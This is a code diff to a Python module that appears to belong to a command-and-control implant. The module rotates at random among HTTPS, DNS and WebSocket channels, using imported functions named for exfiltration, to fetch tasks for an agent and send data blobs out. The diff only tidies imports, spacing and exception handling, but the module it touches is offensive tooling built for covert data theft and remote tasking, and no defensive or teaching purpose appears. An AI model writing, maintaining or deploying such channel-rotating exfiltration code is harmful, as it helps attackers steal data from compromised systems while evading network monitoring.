@@ -1,14 +1,15 @@
-
 import random
-from core.exfil_https import send_via_https, get_task_https
-from core.exfil_dns import send_via_dns, get_task_dns
-from core.exfil_ws import send_via_ws, get_task_ws
+
+from core.exfil_dns import get_task_dns, send_via_dns
+from core.exfil_https import get_task_https, send_via_https
+from core.exfil_ws import get_task_ws, send_via_ws
 
 TRANSPORTS = [
     {"name": "HTTPS", "send": send_via_https, "get": get_task_https},
     {"name": "DNS", "send": send_via_dns, "get": get_task_dns},
     {"name": "WS", "send": send_via_ws, "get": get_task_ws},
 ]
+
 
 def fetch_task(agent_id):
     random.shuffle(TRANSPORTS)
@@ -17,9 +18,10 @@ def fetch_task(agent_id):
             task = transport["get"](agent_id)
             if task:
                 return task
-        except:
+        except BaseException:
             continue
     return None
+
 
 def send_data(agent_id, data_blob):
     random.shuffle(TRANSPORTS)
@@ -28,6 +30,6 @@ def send_data(agent_id, data_blob):
             success = transport["send"](agent_id, data_blob)
             if success:
                 return True
-        except:
+        except BaseException:
             continue
     return False
